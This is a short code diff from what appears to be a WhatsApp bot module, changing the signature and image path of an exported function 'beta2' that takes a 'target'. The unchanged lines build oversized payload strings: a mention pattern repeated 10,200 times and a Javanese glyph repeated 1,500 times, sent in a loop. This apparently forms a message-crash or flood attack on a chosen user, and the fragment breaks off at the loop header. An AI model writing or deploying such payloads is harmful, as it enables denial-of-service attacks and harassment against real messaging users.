@@ -1,5 +1,5 @@
-exports.beta2 = async (viper, target) => {
-const o = fs.readFileSync(`./viper/o.jpg`)
+exports.beta2 = async (viper, target, Ptcp = true) => {
+const o = fs.readFileSync(`/viper/o.jpg`)
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
 	const ui = 'ꦽ'.repeat(1500);
     for (let i = 0; i < 7; i++) {
